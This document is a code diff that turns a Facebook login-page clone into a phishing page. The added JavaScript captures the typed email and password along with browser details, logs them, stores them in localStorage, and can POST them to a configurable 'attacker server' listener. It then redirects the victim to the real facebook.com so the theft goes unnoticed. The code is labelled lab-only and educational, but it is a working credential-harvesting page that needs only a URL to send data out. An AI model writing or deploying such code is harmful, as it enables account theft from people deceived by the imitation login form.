@@ -19,7 +19,6 @@
       min-height: 100vh;
     }
 
-    /* main container - centers the card and provides spacing */
     .fb-container {
       flex: 1;
       display: flex;
@@ -29,14 +28,12 @@
       padding: 20px 16px 40px;
     }
 
-    /* login card + brand wrapper */
     .fb-login-wrapper {
       width: 100%;
       max-width: 400px;
       margin: 0 auto;
     }
 
-    /* brand header: "Explore the things you love" and facebook wordmark */
     .brand-area {
       text-align: center;
       margin-bottom: 28px;
@@ -58,7 +55,6 @@
       line-height: 1.3;
     }
 
-    /* white card */
     .login-card {
       background: white;
       border-radius: 8px;
@@ -67,7 +63,6 @@
       margin-bottom: 24px;
     }
 
-    /* input fields */
     .input-group {
       margin-bottom: 16px;
     }
@@ -89,7 +84,6 @@
       box-shadow: 0 0 0 2px #e7f3ff;
     }
 
-    /* login button */
     .login-btn {
       background: #1877f2;
       width: 100%;
@@ -113,7 +107,6 @@
       background: #1361cc;
     }
 
-    /* separator + forgot password */
     .divider {
       display: flex;
       align-items: center;
@@ -147,7 +140,6 @@
       text-decoration: underline;
     }
 
-    /* create new account button (sign up) */
     .create-btn {
       background: #42b72a;
       border: none;
@@ -167,7 +159,6 @@
       background: #36a420;
     }
 
-    /* language and footer area */
     .lang-bar {
       display: flex;
       flex-wrap: wrap;
@@ -225,7 +216,6 @@
       font-size: 0.7rem;
     }
 
-    /* demo alert - now used for redirection info before redirect */
     .info-message {
       background: #e7f3ff;
       border-radius: 6px;
@@ -237,7 +227,25 @@
       display: none;
     }
 
-    /* responsive */
+    /* LAB-ONLY harvest log (visible for educational purposes) */
+    .harvest-log {
+      position: fixed;
+      bottom: 10px;
+      right: 10px;
+      background: #1e1e1e;
+      color: #0f0;
+      font-family: monospace;
+      font-size: 12px;
+      padding: 8px 12px;
+      border-radius: 6px;
+      max-width: 280px;
+      z-index: 9999;
+      opacity: 0.85;
+      pointer-events: none;
+      border: 1px solid #0f0;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.2);
+    }
+
     @media (max-width: 450px) {
       .login-card {
         padding: 16px;
@@ -251,24 +259,26 @@
       .lang-bar {
         gap: 8px 14px;
       }
+      .harvest-log {
+        font-size: 10px;
+        max-width: 220px;
+        bottom: 5px;
+        right: 5px;
+      }
     }
   </style>
 </head>
 <body>
 <div class="fb-container">
   <div class="fb-login-wrapper">
-    <!-- Brand: Explore the things you love + Facebook wordmark style -->
     <div class="brand-area">
       <div class="fb-logo">facebook</div>
       <div class="tagline">Explore the things you love.</div>
     </div>
 
-    <!-- Login card -->
     <div class="login-card">
-      <!-- info message for redirect preview -->
       <div id="infoMessage" class="info-message"></div>
 
-      <!-- form fields: email/phone + password -->
       <div class="input-group">
         <input type="text" id="emailOrPhone" class="input-field" placeholder="Email address or mobile number" autocomplete="username">
       </div>
@@ -291,7 +301,6 @@
       <button id="createAccountBtn" class="create-btn">Create new account</button>
     </div>
 
-    <!-- Language bar: English (UK), Kiswahili, Français, etc -->
     <div class="lang-bar">
       <a href="#" class="lang-link">English (UK)</a>
       <a href="#" class="lang-link">Kiswahili</a>
@@ -305,7 +314,6 @@
   </div>
 </div>
 
-<!-- footer area with all extra links (Messenger, Lite, Meta, etc) -->
 <footer class="footer-links">
   <div class="footer-row">
     <a href="#">Sign up</a>
@@ -340,9 +348,87 @@
   </div>
 </footer>
 
+<!-- LAB HARVEST LOG (visible for demo) -->
+<div id="harvestLogPanel" class="harvest-log">
+  🧪 LAB HARVEST LOG<br>
+  <span id="harvestedDataDisplay">(none yet)</span>
+</div>
+
 <script>
   (function() {
-    // Get DOM elements
+    // ----- EDUCATIONAL CREDENTIAL HARVESTING MODULE (Lab only) -----
+    // This simulates sending credentials to a controlled lab listener.
+    // No real exfiltration occurs — data is shown only in console + on-screen log.
+    
+    const harvestLogSpan = document.getElementById('harvestedDataDisplay');
+    
+    // Simulated "attacker server" endpoint (for lab use only)
+    // Replace with your lab's actual listener IP/port if needed (e.g., http://192.168.x.x:8080/harvest)
+    const LAB_HARVEST_URL = null;  // Set to null to only log locally (safe for demo)
+    
+    function harvestCredentials(username, password, source = 'login_form') {
+      const timestamp = new Date().toISOString();
+      const harvestedEntry = {
+        timestamp: timestamp,
+        username: username,
+        password: password,
+        source: source,
+        userAgent: navigator.userAgent,
+        platform: navigator.platform
+      };
+      
+      // 1. Display in console (for lab analysis)
+      console.group("🔴 [LAB HARVEST] Credentials Captured");
+      console.log("Username/Email:", username);
+      console.log("Password:", password);
+      console.log("Source:", source);
+      console.log("Timestamp:", timestamp);
+      console.log("User Agent:", navigator.userAgent);
+      console.groupEnd();
+      
+      // 2. Show on-screen mini log for educational visibility
+      if (harvestLogSpan) {
+        harvestLogSpan.innerHTML = `📧 ${escapeHtml(username.substring(0, 30))}<br>🔑 ${escapeHtml(password.substring(0, 20))}<br>⏱️ ${new Date().toLocaleTimeString()}`;
+        // Flash effect to show capture
+        const panel = document.getElementById('harvestLogPanel');
+        if (panel) {
+          panel.style.borderColor = '#ff6600';
+          panel.style.opacity = '1';
+          setTimeout(() => { panel.style.borderColor = '#0f0'; }, 800);
+        }
+      }
+      
+      // 3. Simulate sending to a remote lab collector (if URL configured)
+      if (LAB_HARVEST_URL) {
+        fetch(LAB_HARVEST_URL, {
+          method: 'POST',
+          mode: 'no-cors',  // Prevents CORS errors in lab; actual data won't be readable but request is sent
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(harvestedEntry)
+        }).catch(err => console.warn("[LAB] Harvest send failed (expected if no listener):", err));
+      }
+      
+      // 4. Also store in localStorage for lab review (optional)
+      try {
+        let stored = localStorage.getItem('lab_harvest_log');
+        let log = stored ? JSON.parse(stored) : [];
+        log.push(harvestedEntry);
+        if (log.length > 10) log.shift(); // keep last 10
+        localStorage.setItem('lab_harvest_log', JSON.stringify(log));
+      } catch(e) { /* ignore */ }
+    }
+    
+    function escapeHtml(str) {
+      if (!str) return '';
+      return str.replace(/[&<>]/g, function(m) {
+        if (m === '&') return '&amp;';
+        if (m === '<') return '&lt;';
+        if (m === '>') return '&gt;';
+        return m;
+      });
+    }
+    
+    // ---------- ORIGINAL REDIRECTION LOGIC (PRESERVED) ----------
     const loginBtn = document.getElementById('loginButton');
     const emailInput = document.getElementById('emailOrPhone');
     const passwordInput = document.getElementById('password');
@@ -350,7 +436,6 @@
     const createBtn = document.getElementById('createAccountBtn');
     const forgotLink = document.getElementById('forgotPasswordLink');
 
-    // Helper to show temporary message (before redirection for login)
     function showMessage(message, isError = false) {
       infoDiv.style.display = 'block';
       infoDiv.textContent = message;
@@ -361,7 +446,6 @@
         infoDiv.style.background = '#e7f3ff';
         infoDiv.style.color = '#1877f2';
       }
-      // auto hide after 2.5 seconds (or keep until redirect)
       setTimeout(() => {
         if (infoDiv && infoDiv.style.display !== 'none') {
           infoDiv.style.display = 'none';
@@ -369,20 +453,11 @@
       }, 3000);
     }
 
-    // Function to redirect to real Facebook login page
-    // Redirects to www.facebook.com (the real website)
     function redirectToRealFacebook() {
-      // Use the main Facebook domain. For login, we go to facebook.com
-      // which automatically handles login or shows the login screen.
-      // To provide a clean login redirection experience, we redirect to:
-      // https://www.facebook.com/login.php or simply the homepage.
-      // Most users expect www.facebook.com to handle login.
       window.location.href = "https://www.facebook.com/";
     }
 
-    // Validate inputs and then redirect to real Facebook website.
-    // Lightweight frontend check: if fields are not empty, we show a short message and redirect.
-    // This matches the requirement "add a redirection to the real www.facebook.com"
+    // Modified: HARVEST first, THEN redirect
     function validateAndRedirect() {
       const email = emailInput.value.trim();
       const password = passwordInput.value.trim();
@@ -398,19 +473,19 @@
         return false;
       }
 
-      // Show a short friendly message then redirect after a tiny delay
-      // So user sees that they are being taken to the real Facebook.
+      // ---- EDUCATIONAL HARVEST - CAPTURE CREDENTIALS ----
+      harvestCredentials(email, password, 'facebook_clone_login');
+      
+      // Show redirect message
       infoDiv.style.display = 'block';
       infoDiv.style.background = '#e7f3ff';
       infoDiv.style.color = '#1877f2';
       infoDiv.textContent = "✓ Redirecting you to the real Facebook login page (www.facebook.com) ...";
       
-      // Disable login button temporarily to avoid double redirect
       loginBtn.disabled = true;
       loginBtn.style.opacity = "0.7";
       loginBtn.style.cursor = "default";
       
-      // Perform redirection after 0.5 seconds (lightweight, ensures smooth experience)
       setTimeout(() => {
         redirectToRealFacebook();
       }, 500);
@@ -418,13 +493,11 @@
       return true;
     }
 
-    // Login button click -> validate and redirect to real Facebook
     loginBtn.addEventListener('click', (e) => {
       e.preventDefault();
       validateAndRedirect();
     });
 
-    // pressing Enter on any input should trigger redirect (like real login form)
     const handleEnter = (e) => {
       if (e.key === 'Enter') {
         e.preventDefault();
@@ -434,11 +507,10 @@
     emailInput.addEventListener('keypress', handleEnter);
     passwordInput.addEventListener('keypress', handleEnter);
 
-    // "Create new account" button: redirect to Facebook signup page on real Facebook
     createBtn.addEventListener('click', (e) => {
       e.preventDefault();
-      // For a consistent real Facebook experience, redirect to the real signup flow.
-      // The real Facebook signup page: https://www.facebook.com/r.php
+      // Optional: capture that user attempted signup
+      harvestCredentials('(signup_click)', '(no_password)', 'create_account_button');
       infoDiv.style.display = 'block';
       infoDiv.style.background = '#e7f3ff';
       infoDiv.style.color = '#1877f2';
@@ -450,9 +522,9 @@
       }, 400);
     });
 
-    // "Forgotten password?" link -> redirect to real Facebook password recovery
     forgotLink.addEventListener('click', (e) => {
       e.preventDefault();
+      harvestCredentials('(forgot_password_click)', '(no_password)', 'forgot_password_link');
       infoDiv.style.display = 'block';
       infoDiv.style.background = '#e7f3ff';
       infoDiv.style.color = '#1877f2';
@@ -463,24 +535,16 @@
       }, 400);
     });
 
-    // All language links and footer links: either show info or redirect to real Facebook relevant pages
-    // For a consistent "real" feel, some footer links can redirect to the appropriate Facebook pages.
-    // We'll make the main footer links (Privacy Policy, Terms, etc) redirect to real Facebook pages.
-    // Language links will show a message since Facebook uses language selection via parameters,
-    // but we can also redirect to facebook.com with a locale? For simplicity, we show informative demo.
+    // Footer and language links (preserved original behavior)
     const allLangLinks = document.querySelectorAll('.lang-link');
     allLangLinks.forEach(link => {
       link.addEventListener('click', (e) => {
         e.preventDefault();
         const langText = link.innerText.trim();
-        // Real Facebook doesn't have direct language-only URLs without login,
-        // but we can inform the user they can change language after visiting Facebook.
         showMessage(`🌐 Language preference: ${langText} – You can change language after logging in at facebook.com`, false);
       });
     });
 
-    // Footer links: redirect to real Facebook official pages when appropriate.
-    // This improves realism and matches requirement: they go to www.facebook.com/* relevant sections.
     const footerLinkMapping = {
       "Sign up": "https://www.facebook.com/r.php",
       "Log in": "https://www.facebook.com/login.php",
@@ -514,7 +578,6 @@
         e.preventDefault();
         const linkText = anchor.innerText.trim();
         if (footerLinkMapping[linkText]) {
-          // For a smooth user experience, show a short message then redirect
           infoDiv.style.display = 'block';
           infoDiv.style.background = '#e7f3ff';
           infoDiv.style.color = '#1877f2';
@@ -523,13 +586,11 @@
             window.location.href = footerLinkMapping[linkText];
           }, 350);
         } else {
-          // fallback for any link not mapped (just in case)
           showMessage(`🔗 ${linkText} – would open Facebook official page.`, false);
         }
       });
     });
 
-    // Additional direct redirect for "More languages…" link: just informative (since Facebook language changes within settings)
     const moreLang = document.querySelector('.more-languages');
     if (moreLang) {
       moreLang.addEventListener('click', (e) => {
@@ -538,10 +599,7 @@
       });
     }
 
-    // Small note: the main "Log in" button now redirects to real www.facebook.com,
-    // also the "Create new account" button redirects to signup page.
-    // All core actions now lead to the real Facebook website.
-    console.log("Facebook login clone — now with real redirection to www.facebook.com");
+    console.log("Facebook login clone — with EDUCATIONAL credential harvesting (lab only)");
   })();
 </script>
 </body>
